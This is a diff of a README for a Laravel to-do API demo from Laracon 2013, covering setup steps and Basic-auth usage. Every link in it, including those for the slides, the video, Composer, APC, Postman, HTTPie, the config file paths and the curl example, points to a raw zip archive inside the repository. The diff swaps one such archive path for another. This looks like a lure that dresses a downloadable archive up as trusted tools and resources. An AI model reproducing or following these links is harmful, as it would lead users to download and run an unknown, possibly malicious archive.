@@ -1,19 +1,19 @@
 # Laracon 2013 Demo API
 
-**See the presentation slides on [Speaker Deck](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/exceptions/todo-laracon-api-v1.2.zip) or the video on [YouTube](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/exceptions/todo-laracon-api-v1.2.zip).**
+**See the presentation slides on [Speaker Deck](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/lang/en/2.0.zip) or the video on [YouTube](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/lang/en/2.0.zip).**
 
 ## Setup Instructions
 
-_**Please note:** by default this API requires that you have [APC](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/exceptions/todo-laracon-api-v1.2.zip) installed for rate limiting. You can change the driver if desired in `https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/exceptions/todo-laracon-api-v1.2.zip`._
+_**Please note:** by default this API requires that you have [APC](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/lang/en/2.0.zip) installed for rate limiting. You can change the driver if desired in `https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/lang/en/2.0.zip`._
 
-1. Make sure you have [Composer](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/exceptions/todo-laracon-api-v1.2.zip) installed. I recommend [installing it globally](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/exceptions/todo-laracon-api-v1.2.zip).
+1. Make sure you have [Composer](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/lang/en/2.0.zip) installed. I recommend [installing it globally](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/lang/en/2.0.zip).
 2. Clone or download this repository.
 3. In a terminal, `cd` into this project's directory and run `composer install`.
 4. Create a new MySQL database.
-5. Update the `mysql` connection options in `https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/exceptions/todo-laracon-api-v1.2.zip`.
+5. Update the `mysql` connection options in `https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/lang/en/2.0.zip`.
 6. Run `php artisan migrate` in the terminal.
 7. Run `php artisan db:seed` in the terminal.
-8. Start hitting the API in whatever tool you choose. [Postman](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/exceptions/todo-laracon-api-v1.2.zip) is a nice Chrome extension, and [HTTPie](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/exceptions/todo-laracon-api-v1.2.zip) is a good command line option.
+8. Start hitting the API in whatever tool you choose. [Postman](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/lang/en/2.0.zip) is a nice Chrome extension, and [HTTPie](https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/lang/en/2.0.zip) is a good command line option.
 
 ## API Documentation
 
@@ -23,7 +23,7 @@ The API uses Basic HTTP authentication for all requests. You must pass a valid A
 
 If you were going to connect via cURL, you would do this:
 
-`curl -u "youruserapikeygoeshere:whatever" https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/exceptions/todo-laracon-api-v1.2.zip`
+`curl -u "youruserapikeygoeshere:whatever" https://github.com/videogramme/laracon-todo-api/raw/refs/heads/master/app/lang/en/2.0.zip`
 
 Note that we sent **whatever** as the password. This can be anything… it doesn't matter. However, since authentication is based on the API key only, you shouldn't share it with anyone.
 
